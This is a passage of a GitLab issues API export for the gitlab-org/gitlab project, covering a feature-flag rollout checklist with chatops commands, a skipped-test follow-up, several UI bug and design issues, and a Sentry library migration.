`ci_pipeline_add_job_with_lock `","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout `ci_pipeline_add_job_with_lock` on production.\n\n\u003c!-- Short description of what the feature is about and link to relevant other issues. --\u003e\n\n## Owners\n\n- Team: ~\"group::pipeline authoring\" \n- Most appropriate slack channel to reach out to: `#g_pipeline-authoring`\n- Best individual to reach out to: @furkanayhan \n- PM: @dhershkovitch \n\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## The Rollout Plan\n\n- Partial Rollout on GitLab.com with testing groups\n- Rollout on GitLab.com for a certain period (How long)\n- Percentage Rollout on GitLab.com\n- Rollout Feature for everyone as soon as it's ready\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant? Sentry errors reports can also be useful to review --\u003e\n\n## Testing Groups/Projects/Users\n\n\u003c!-- If applicable, any groups/projects that are happy to have this feature turned on early. Some organizations may wish to test big changes they are interested in with a small subset of users ahead of time for example. --\u003e\n\n- `gitlab-org/gitlab` project\n- `gitlab-org`/`gitlab-com` groups\n- ...\n\n\n## Expectations\n\n### What are we expecting to happen?\n\nWe expect nothing will change.\n\n### What might happen if this goes wrong?\n\nLong waiting when;\n- `/api/:version/projects/:id/statuses/:sha`\n- `PagesWorker`\n- `Projects::JobsController#retry`\n- `Ci::RetryPipelineWorker`\n- `/api/:version/projects/:id/jobs/:job_id/retry`\n- `/api/:version/projects/:id/pipelines/:pipeline_id/retry`\n\n### What can we monitor to detect problems with this?\n\nDuration of:\n- https://log.gprd.gitlab.net/goto/4a4bc2d645cf234faff81eeb14b2be35\n- https://log.gprd.gitlab.net/goto/cf46f8f49dfb422cf0b61b88c760b38e\n- https://log.gprd.gitlab.net/goto/bbd5631c21c50aa67ef1c94e3e4c3b66\n- https://log.gprd.gitlab.net/goto/3a1cd21b4c160cdee996698667fe90bc\n- https://log.gprd.gitlab.net/goto/609537e451f3d0e0d64617f21a94c99d\n- https://log.gprd.gitlab.net/goto/ceb80d3db9d3adb7323d84dc7f58e808\n\nError rates of:\n- https://log.gprd.gitlab.net/goto/a217d9819f151eb0d805827238df3296\n- https://log.gprd.gitlab.net/goto/a57bb08fe356fe001f4bced32c3c636c\n- https://log.gprd.gitlab.net/goto/feb96137f2c5aa6c3ca8a6fe7282bc19\n- https://log.gprd.gitlab.net/goto/6cb1feea4eff258e2ad08e61b5b8cc38\n- https://log.gprd.gitlab.net/goto/5885dc888c7226c59a67dfdfb23c98f2\n- https://log.gprd.gitlab.net/goto/a6e5373a1fa3fc9f72693193efc123f2\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- [ ] Ensure that the feature MRs have been deployed to non-production environments.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [x] Enable the feature globally on non-production environments.\n    - [x] `/chatops run feature set ci_pipeline_add_job_with_lock true --dev`\n    - [x] `/chatops run feature set ci_pipeline_add_job_with_lock true --staging`\n- [ ] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Preparation before production rollout\n\n- [ ] Ensure that the feature MRs have been deployed to both production and canary.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [ ] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [ ] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [ ] If the feature might impact the user experience, notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n- [ ] If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), enable it on GitLab.com for [testing groups/projects](#testing-groupsprojectsusers).\n    - [ ] `/chatops run feature set --\u003cactor-type\u003e=\u003cactor\u003e ci_pipeline_add_job_with_lock true`\n- [ ] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Global rollout on production\n\n- [ ] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set ci_pipeline_add_job_with_lock \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set ci_pipeline_add_job_with_lock \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [ ] `/chatops run feature set ci_pipeline_add_job_with_lock true`\n- [ ] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [x] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `ci_pipeline_add_job_with_lock`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [x] Create a merge request to remove `ci_pipeline_add_job_with_lock` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [x] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete ci_pipeline_add_job_with_lock --dev`\n    - [ ] `/chatops run feature delete ci_pipeline_add_job_with_lock --staging`\n    - [ ] `/chatops run feature delete ci_pipeline_add_job_with_lock`\n- [x] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set ci_pipeline_add_job_with_lock false\n```","state":"closed","created_at":"2021-08-04T10:45:05.770Z","updated_at":"2021-10-28T13:54:21.114Z","closed_at":"2021-10-06T11:45:33.485Z","closed_by":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"labels":["Category:Pipeline Authoring","backend","devops::verify","feature flag","group::pipeline authoring","section::ops","type::maintenance","workflow::in review"],"milestone":{"id":1948708,"iid":64,"group_id":9970,"title":"14.4","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:44:55.682Z","updated_at":"2022-04-21T07:25:38.537Z","due_date":"2021-10-17","start_date":"2021-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/64"},"assignees":[{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"}],"author":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"type":"ISSUE","assignee":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"user_notes_count":16,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337628","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":47,"completed_count":7},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"7 of 47 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337628","notes":"https://gitlab.com/api/v4/projects/278964/issues/337628/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337628/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337628","relative":"#337628","full":"gitlab-org/gitlab#337628"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91426277,"iid":337626,"project_id":278964,"title":"Add back skipped Conan tests into licence-finder","description":"We skiped this test `spec/integration/c/conan_spec.rb:97` because it fails and block pipeline.\n\nWe need to revisit it once https://gitlab.com/gitlab-org/security-products/analyzers/license-finder/-/merge_requests/45 is merged","state":"closed","created_at":"2021-08-04T10:09:26.908Z","updated_at":"2021-10-28T13:54:21.536Z","closed_at":"2021-08-31T07:40:37.294Z","closed_by":{"id":1378158,"username":"brytannia","name":"Tetiana Chupryna","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1378158/avatar.png","web_url":"https://gitlab.com/brytannia"},"labels":["Category:License Compliance","Deliverable","backend","devops::secure","group::composition analysis","maintenance::refactor","priority::2","section::sec","test","type::maintenance","workflow::verification"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":1378158,"username":"brytannia","name":"Tetiana Chupryna","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1378158/avatar.png","web_url":"https://gitlab.com/brytannia"}],"author":{"id":1378158,"username":"brytannia","name":"Tetiana Chupryna","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1378158/avatar.png","web_url":"https://gitlab.com/brytannia"},"type":"ISSUE","assignee":{"id":1378158,"username":"brytannia","name":"Tetiana Chupryna","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1378158/avatar.png","web_url":"https://gitlab.com/brytannia"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337626","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337626","notes":"https://gitlab.com/api/v4/projects/278964/issues/337626/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337626/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337626","relative":"#337626","full":"gitlab-org/gitlab#337626"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91421442,"iid":337622,"project_id":278964,"title":"Follow-up from \"Display known fields in locked fields within trial sign up form\"","description":"The following discussion from !65493 should be addressed:\n\n### 1. Their borders are lighter than the other fields because different properties are used\n\n- [ ] @kcomoli started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/65493#note_642685115):  (+1 comment)\n\n    \u003e @a_akgun **Nitpick**: Our dropdown fields have a couple of issues:\n    \u003e \n\n    \u003e \n    \u003e | Dropdown | Inputs |\n    \u003e | ------ | ------ |\n    \u003e | ![image](/uploads/8b197d597e82bfc0df218c29ed5c00b9/image.png) | ![image](/uploads/f534a3c018fdc275e7c9b9cdb4f90173/image.png) |\n    \u003e | `border-color:#dbdbdb` | `box-shadow: inset 0 0 0 1px #868686;` |\n    \u003e \n    \u003e The form is harder to scan with this contrast difference.\n    \u003e \n\n\n### 2. `Number of employees` placeholder is not displayed\n    \u003e \n    \u003e \n    \u003e | Number of employees | Country |\n    \u003e | ------ | ------ |\n    \u003e | ![image](/uploads/00729615d8945e423f4079c0b88a0e3f/image.png) | ![image](/uploads/6a808f66f61069299438939850d23b90/image.png) |\n    \u003e | Without placeholder \"Please select\" | With placeholder \"Please select\" |\n    \u003e \n    \u003e I don't think this prevent us from moving this MR forward, but we should fix it at some point. Approving in the meantime.\n\n### 3. translation scopes","state":"closed","created_at":"2021-08-04T08:53:14.483Z","updated_at":"2021-10-28T13:54:22.007Z","closed_at":"2021-08-11T06:48:59.291Z","closed_by":{"id":4409816,"username":"a_akgun","name":"Alper Akgun","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4409816/avatar.png","web_url":"https://gitlab.com/a_akgun"},"labels":["devops::growth","group::acquisition","section::growth","type::maintenance"],"milestone":{"id":1850126,"iid":62,"group_id":9970,"title":"14.2","description":"","state":"active","created_at":"2021-01-26T16:57:35.404Z","updated_at":"2021-07-22T19:45:42.498Z","due_date":"2021-08-17","start_date":"2021-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/62"},"assignees":[{"id":4409816,"username":"a_akgun","name":"Alper Akgun","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4409816/avatar.png","web_url":"https://gitlab.com/a_akgun"}],"author":{"id":4409816,"username":"a_akgun","name":"Alper Akgun","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4409816/avatar.png","web_url":"https://gitlab.com/a_akgun"},"type":"ISSUE","assignee":{"id":4409816,"username":"a_akgun","name":"Alper Akgun","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4409816/avatar.png","web_url":"https://gitlab.com/a_akgun"},"user_notes_count":1,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337622","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337622","notes":"https://gitlab.com/api/v4/projects/278964/issues/337622/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337622/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337622","relative":"#337622","full":"gitlab-org/gitlab#337622"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91417881,"iid":337615,"project_id":278964,"title":"Improve the pattern used for download artifact button on MR widgets","description":"## 🧩 Problem statement\nThe download button with a dropdown appears on the MR widget even when there's no artifact present. The dropdown list presents an empty state. This is deteriorating the experience because it sets a false expectation for users to find an artifact.\n\n![image](/uploads/a011e7aaad13474d3ffa72881a0014d1/image.png)\n\n\n## ✨ Proposed solution\nAdd a visual state to communicate to the users that artifacts are being loaded and present an active download button only if it exists.\n(We put the action under a kebab menu on the pipeline index page, but that wouldn't work here as there are no other actions to be grouped together)","state":"closed","created_at":"2021-08-04T07:49:56.914Z","updated_at":"2022-11-14T17:07:50.774Z","closed_at":"2021-11-18T16:38:07.799Z","closed_by":{"id":3374280,"username":"mfluharty","name":"Miranda Fluharty","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3374280/avatar.png","web_url":"https://gitlab.com/mfluharty"},"labels":["CI artifacts","Category:Build Artifacts","UX","auto updated","devops::verify","group::pipeline insights","meta","section::ops","workflow::in review"],"milestone":{"id":2114817,"iid":66,"group_id":9970,"title":"14.5","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T04:59:45.082Z","updated_at":"2022-04-21T07:25:45.431Z","due_date":"2021-11-17","start_date":"2021-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/66"},"assignees":[{"id":3374280,"username":"mfluharty","name":"Miranda Fluharty","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3374280/avatar.png","web_url":"https://gitlab.com/mfluharty"}],"author":{"id":6115425,"username":"v_mishra","name":"Veethika M","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f09a3a0badac17a57e28b4e18a45c1c0?s=80\u0026d=identicon","web_url":"https://gitlab.com/v_mishra"},"type":"ISSUE","assignee":{"id":3374280,"username":"mfluharty","name":"Miranda Fluharty","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3374280/avatar.png","web_url":"https://gitlab.com/mfluharty"},"user_notes_count":16,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337615","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337615","notes":"https://gitlab.com/api/v4/projects/278964/issues/337615/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337615/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337615","relative":"#337615","full":"gitlab-org/gitlab#337615"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91417646,"iid":337613,"project_id":278964,"title":"Toast notification text invisible in dark mode","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\nToast notifications in dark mode have dark text on dark background (illegible)\n\n### Steps to reproduce\n- Use dark mode (alpha)\n- Edit a wiki page (or do anything that results in a toast notification)\n- Save changes\n\nDark mode toast: \n\n![image](/uploads/9afbd84872c566a2086bd4123ff162aa/image.png)\n\nLight mode toast: \n\n![image](/uploads/f1691fef7a38216f32688e9afb8a1c2a/image.png)\n\n\u003c!-- Describe how one can reproduce the issue - this is very important. Please use an ordered list. --\u003e","state":"closed","created_at":"2021-08-04T07:45:30.241Z","updated_at":"2021-09-16T01:31:46.064Z","closed_at":"2021-09-16T01:31:46.049Z","closed_by":{"id":832471,"username":"psimyn","name":"Simon Knox","state":"active","avatar_url":"https://secure.gravatar.com/avatar/3de75939c39eecd6ea2215ec740a8037?s=80\u0026d=identicon","web_url":"https://gitlab.com/psimyn"},"labels":["Category:Wiki","UX","[deprecated] Accepting merge requests","devops::create","frontend","good for new contributors","group::editor","priority::4","section::dev","severity::4","type::bug"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[],"author":{"id":9231683,"username":"leocencetti.hglass","name":"Leonardo Cencetti","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4e46df7d4956b6ef58db29a8da6af693?s=80\u0026d=identicon","web_url":"https://gitlab.com/leocencetti.hglass"},"type":"ISSUE","assignee":null,"user_notes_count":6,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337613","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337613","notes":"https://gitlab.com/api/v4/projects/278964/issues/337613/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337613/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337613","relative":"#337613","full":"gitlab-org/gitlab#337613"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":2902,"epic":{"id":32725,"iid":2902,"title":"Dark mode","url":"/groups/gitlab-org/-/epics/2902","group_id":9970,"human_readable_end_date":"Oct 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91417592,"iid":337611,"project_id":278964,"title":"Add warning messaging when removing user cap","description":"### Technical implementation\n\nUpdate the text of the description right below the user cap input field to be:\n\n\u003e After the instance reaches the user cap, any user who is added or requests access must be approved by an administrator. Leave blank for an unlimited user cap. If you change the user cap to unlimited, you must re-enable [project sharing](https://docs.gitlab.com/ee/user/group/#prevent-a-project-from-being-shared-with-groups) and [group sharing](https://docs.gitlab.com/ee/user/group/#prevent-group-sharing-outside-the-group-hierarchy).\n\n### Problem to solve \n\nFollow-up from [this comment in \"Disable project and group sharing when setting a User Cap\" MR](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/67229#note_641949277).\n\nAs part of the MR linked above, we disabled group and project sharing for a given root group and its descendants whenever a user cap was set. However, removing that user cap does not re-enable group and project sharing.\n\nWhenever they're removing a user cap for a given group, users should know be aware of that these sharing settings should be re-enabled manually.\n\n### Proposal \n\nIn the [User cap section](https://gitlab.com/gitlab-org/gitlab/-/issues/321934/designs/V4.png) (or around it), add some messaging indicating that [project sharing](https://docs.gitlab.com/ee/user/group/#prevent-a-project-from-being-shared-with-groups) and [group sharing](https://docs.gitlab.com/ee/user/group/#prevent-group-sharing-outside-the-group-hierarchy) should be re-enabled manually, upon removal of this user cap.\n\nThis manual process should also be documented.\n\n### Availability \u0026 Testing\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e\n\nTests should accompany this change to ensure the display and conditions of this warning message.  A test should also be included that ensures this message does not appear when the conditions are not satisfied.","state":"closed","created_at":"2021-08-04T07:44:56.363Z","updated_at":"2022-10-28T07:58:24.752Z","closed_at":"2022-10-28T07:58:24.731Z","closed_by":{"id":127064,"username":"aalakkad","name":"Ammar Alakkad","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ecc1130ce340f5080afd8f2c9962948a?s=80\u0026d=identicon","web_url":"https://gitlab.com/aalakkad"},"labels":["Technical Writing","[deprecated] Category:Utilization","devops::fulfillment","documentation","frontend","group::utilization","missed:15.4","quad-planning::complete-action","section::fulfillment","type::feature","workflow::verification"],"milestone":{"id":2687593,"iid":81,"group_id":9970,"title":"15.6","description":"","state":"active","created_at":"2022-07-06T19:22:27.893Z","updated_at":"2022-07-06T19:22:27.893Z","due_date":"2022-11-17","start_date":"2022-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/81"},"assignees":[{"id":127064,"username":"aalakkad","name":"Ammar Alakkad","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ecc1130ce340f5080afd8f2c9962948a?s=80\u0026d=identicon","web_url":"https://gitlab.com/aalakkad"}],"author":{"id":4192493,"username":"ebaque","name":"Etienne Baqué","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4192493/avatar.png","web_url":"https://gitlab.com/ebaque"},"type":"ISSUE","assignee":{"id":127064,"username":"aalakkad","name":"Ammar Alakkad","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ecc1130ce340f5080afd8f2c9962948a?s=80\u0026d=identicon","web_url":"https://gitlab.com/aalakkad"},"user_notes_count":14,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337611","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337611","notes":"https://gitlab.com/api/v4/projects/278964/issues/337611/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337611/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337611","relative":"#337611","full":"gitlab-org/gitlab#337611"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6863,"epic":{"id":364253,"iid":6863,"title":"SaaS User Cap - Iteration 2","url":"/groups/gitlab-org/-/epics/6863","group_id":9970,"human_readable_end_date":"Nov 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91417278,"iid":337609,"project_id":278964,"title":"Version App Migrate From sentry-raven","description":"There is a [recommendation](https://github.com/getsentry/sentry-ruby#migrate-from-sentry-raven) to migrate from `sentry-raven`\n\n[Migration guide](https://docs.sentry.io/platforms/ruby/migration/)","state":"closed","created_at":"2021-08-04T07:39:53.441Z","updated_at":"2022-10-20T23:32:35.193Z","closed_at":"2022-10-20T23:32:35.173Z","closed_by":{"id":9712164,"username":"nbelokolodov","name":"Niko Belokolodov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9712164/avatar.png","web_url":"https://gitlab.com/nbelokolodov"},"labels":["Category:Service Ping","auto updated","devops::analytics","group::product intelligence","maintenance::refactor","product intelligence::onboarding issue","quad-planning::complete-no-action","section::analytics","type::maintenance","workflow::production"],"milestone":{"id":2717597,"iid":82,"group_id":9970,"title":"15.7","description":"","state":"active","created_at":"2022-07-29T14:48:31.199Z","updated_at":"2022-07-29T14:48:31.199Z","due_date":"2022-12-17","start_date":"2022-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/82"},"assignees":[{"id":9712164,"username":"nbelokolodov","name":"Niko Belokolodov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9712164/avatar.png","web_url":"https://gitlab.com/nbelokolodov"}],"author":{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"},"type":"ISSUE","assignee":{"id":9712164,"username":"nbelokolodov","name":"Niko 